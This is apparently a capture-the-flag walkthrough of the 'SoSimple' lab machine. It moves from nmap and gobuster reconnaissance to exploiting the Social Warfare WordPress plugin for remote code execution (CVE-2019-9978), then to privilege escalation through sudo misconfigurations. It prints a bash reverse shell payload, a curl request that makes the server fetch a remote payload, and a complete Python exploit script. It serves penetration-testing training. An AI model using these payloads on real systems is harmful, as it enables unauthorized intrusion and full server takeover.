# SoSimple

***

IP=192.168.174.78

## NMAP

```bash
nmap -p- --open -sS --min-rate 5000 -v -n -Pn $IP
```

1. **`-p-`**: This option specifies that Nmap should scan all 65535 ports on the target host. The hyphen after `-p` indicates scanning all ports.
2. **`--open`**: This option tells Nmap to show only open ports, i.e., ports that are actively accepting connections.
3. **`-sS`**: This flag enables SYN stealth scanning. It's a common scanning technique used to reduce the chances of being detected by firewalls and intrusion detection systems.
4. **`--min-rate 5000`**: This sets the minimum rate at which Nmap sends packets. In this case, it's set to 5000 packets per second. This can be useful for increasing the speed of the scan.
5. **`-v`**: This enables verbose mode, which provides more detailed output about the scan in the terminal.
6. **`-n`**: This option tells Nmap not to perform DNS resolution on discovered IP addresses. This can speed up the scan as DNS resolution can sometimes cause delays.
7. **`-Pn`**: This option skips host discovery and treats all hosts as online. Normally, Nmap first performs host discovery to identify hosts that are online before scanning them. This option disables that step.
8. **`$IP`**: This is a placeholder for the target IP address. You should replace `$IP` with the actual IP address you want to scan.

NMAP discovers **2** open ports.

| Port Number | Service |
| ----------- | ------- |
| 22          | SSH     |
| 80          | HTTP    |

```bash
nmap -sCV -p22,80 $IP
```

* **`-sC`**: This option enables the use of default scripts. Nmap comes with a wide range of scripts that can be used for various purposes, such as version detection, vulnerability scanning, and more. The `-sC` option instructs Nmap to use these default scripts against the target host.
* **`-V`**: This option enables version detection. Nmap will attempt to determine the version of the services running on the open ports. Knowing the version information can be crucial for identifying vulnerabilities associated with specific software versions.

```perl
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the host is likely running _Ubuntu 20.04 focal_.

## 80- HTTP

### Web fingerprinting

```bash
whatweb http://$IP
```

| **URL**              | `http://192.168.174.78` |
| -------------------- | ----------------------- |
| **Response Status**  | `200 OK`                |
| **Web Server**       | `Apache/2.4.41`         |
| **Operating System** | `Ubuntu Linux`          |
| **Title**            | `So Simple`             |

### Fuzzing

```bash
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,html,txt
```

* **`dir`**: This specifies the mode of operation, indicating that `gobuster` will perform directory brute-forcing.
* **`-u http://$IP`**: This option specifies the target URL (`http://$IP`) where the directory and file brute-forcing will be performed. `$IP` is a placeholder for the actual IP address.
* **`-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`**: This option specifies the wordlist (`directory-list-2.3-medium.txt`) to be used for brute-forcing. A wordlist contains a list of potential directory and file names that `gobuster` will attempt.
* **`-t 50`**: This option sets the number of concurrent threads to 50. `gobuster` can perform multiple brute-force attempts simultaneously, which can speed up the process.
* **`-b 403,404`**: This option tells `gobuster` to ignore HTTP status codes 403 (Forbidden) and 404 (Not Found). When a web server responds with these status codes, it usually means that the directory or file does not exist or is protected. By ignoring these codes, `gobuster` continues its brute-forcing attempts.
* **`-x php,html,txt`**: This option specifies the file extensions to be brute-forced. In this case, `gobuster` will look for files with `.php`, `.html`, and `.txt` extensions within the discovered directories.

Gobuster successfully discovered the `/wordpress` directory during the directory brute-forcing process on the web server.

```perl
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.174.78/wordpress/]
```

### Wordpress

```bash
wpscan --url https://$IP/wordpress
```

* **`wpscan`**: This is a popular open-source tool specifically designed for WordPress vulnerability assessment and security testing.
* **`--url https://$IP/wordpress`**: This option specifies the target WordPress website's URL. `$IP` is a placeholder for the actual IP address, and `/wordpress` indicates the specific directory path where the WordPress website is installed. The tool will scan this URL for vulnerabilities.

When you run this command, `wpscan` performs a series of tests and checks against the specified WordPress installation. This can include:

1. **Enumerating Users**: `wpscan` can attempt to enumerate WordPress users, which is crucial for understanding the potential attack surface. It can identify usernames, and in some cases, even estimate their roles and privileges.
2. **Enumerating Plugins and Themes**: The tool checks the installed plugins and themes, their versions, and compares them against a database of known vulnerabilities. If any vulnerable plugins or themes are found, `wpscan` reports them.
3. **Brute-Forcing Usernames and Passwords**: `wpscan` can perform brute-force attacks to guess usernames and passwords, especially if weak credentials are suspected.
4. **Checking WordPress Core Vulnerabilities**: It scans the WordPress core for known vulnerabilities and misconfigurations.
5. **Checking for Vulnerable Timthumb Scripts**: Timthumb is a popular image resizing script used in many WordPress themes. `wpscan` can identify vulnerable instances of Timthumb.
6. **Identifying Vulnerable Configurations**: The tool checks for sensitive files and configurations that might be accidentally exposed, such as backup files, readme files, or configuration files with overly permissive permissions.

#### Plugins identified

```perl
[+] social-warfare
 | Location: http://192.168.174.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2023-09-28T11:24:00.000Z
 | [!] The version is out of date, the latest version is 4.4.2
 |
 | Version: 3.5.0 (100% confidence)
```

It seems like a vulnerable version to **RCE**

```bash
searchsploit social warfare 
```

| Exploit Title                                                   | Path                 |
| --------------------------------------------------------------- | -------------------- |
| WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution | php/webapps/46794.py |

In the review of the code, it is observed that the vulnerability path `wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s` reveals that the server processes a URL parameter. The injection of a payload directly into the URL can exploit this vulnerability. For example, if an attacker intends to execute a command using a PHP reverse shell payload, they can employ `curl` to send an HTTP GET request with the payload appended to the URL. This method could potentially allow unauthorized access to the server.

**Create Payload**: First, a payload is created using a Bash reverse shell command. The payload is as follows:

```bash
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.45.160/1234 0>&1'")</pre>
```

This payload establishes a reverse shell connection to the IP address `192.168.45.160` on port `1234`.

**Start Listening for Connections**: On the attacker's machine, the netcat (`nc`) command is used to listen for incoming connections on port `1234`. The command is:

```bash
nc -lvnp 1234
```

* **`-l`**: This option stands for "listen mode." When used, `netcat` listens for incoming connections rather than initiating a connection to a remote host. It's essential for setting up a server or listener.
* **`-v`**: This option enables verbose mode, which means `netcat` will provide more detailed output about the connections and data transfer.
* **`-n`**: This option tells `netcat` not to do DNS resolution. It ensures that IP addresses are displayed instead of attempting to resolve hostnames, which can speed up the connection process.

**Set Up an HTTP Server**: On the attacker's machine, an HTTP server is started using Python 3 to serve the payload file. The command to start the HTTP server is:

```bash
python3 -m http.server
```

**Exploit the Vulnerability**: On the compromised WordPress site, the attacker uses the `curl` command to send a GET request to the vulnerable path, injecting the payload URL. **Remote Code Execution (RCE)** is a vulnerability that allows an attacker to execute arbitrary code or commands on a target system remotely. In the context of web applications, RCE occurs when an attacker can inject and execute malicious code on the server from a remote location.

```bash
curl "http://$IP/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.160/payload.txt"
```

Here, `$IP` represents the IP address of the compromised WordPress site. The payload is fetched from `http://192.168.45.160/payload.txt` and executed on the vulnerable server.

#### [Script](https://github.com/20dani09/CVE-2019-9978)

```python
import sys
import requests
from urllib.parse import urljoin
import argparse

class Exploit:
    VULN_PATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"

    def __init__(self, target, payload_url):
        self.target = target
        self.payload_url = payload_url

    def engage(self):
        full_url = urljoin(self.target, self.VULN_PATH % self.payload_url)
        response = requests.get(full_url)

        if response.status_code == 500:
            print("[*] Received Response From Server!")
            content = response.text.split('<!DOCTYPE')[0]
            print("[<] Received:\n", content.strip())
        else:
            sys.exit("[~] Unexpected Status Received!")

def main():
    parser = argparse.ArgumentParser(description="Exploit WordPress RCE vulnerability.")
    parser.add_argument('-t', '--target', dest="target", required=True, help="Target Link")
    parser.add_argument('-p', '--payload-url', dest="payload_url", required=True, help="URL where the payload is hosted")

    args = parser.parse_args()

    print("[>] Sending Payload to System!")
    exploit = Exploit(args.target, args.payload_url)
    exploit.engage()

if __name__ == "__main__":
    main()
```

```bash
python3 script2.py -t http://$IP/wordpress/ -p http://192.168.45.160/payload.txt
```

## PrivEsc

### Id\_rsa

A potential private SSH key file, `id_rsa`, was found in the `/home/max/.ssh/` directory.

SSH keys are used for secure authentication to remote systems. The private key, usually named `id_rsa`, should be kept secret and secure. If such a key file is found in a vulnerable or public location, it could lead to unauthorized access if someone gains access to the key.

The permission `600` means that the owner (in this case, the user `max`) has read and write access, while no other users have any permissions.

```bash
chmod 600 id_rsa
```

To connect securely using this private key, we use the SSH client's `-i` option to specify the private key file.

```bash
ssh -i id_rsa max@$IP
```

### Sudoers

The `sudo -l` command is used to list the allowed (or forbidden) commands that a user can run with `sudo` privileges.

```perl
User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

The [service](https://gtfobins.github.io/gtfobins/service) binary allow to execute a shell on the user steven

```bash
sudo -u steven service ../../bin/sh
```

### Sudoers root

```perl
User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

That tools directory does not exist, neither the script. So we just create a _/opt/tools/server-health.sh_ script that executes a bash.

```bash
mkdir /opt/tools
echo "bash" > /opt/tools/server-health.sh
chmod +x /opt/tools/server-health.sh
sudo /opt/tools/server-health.sh
```
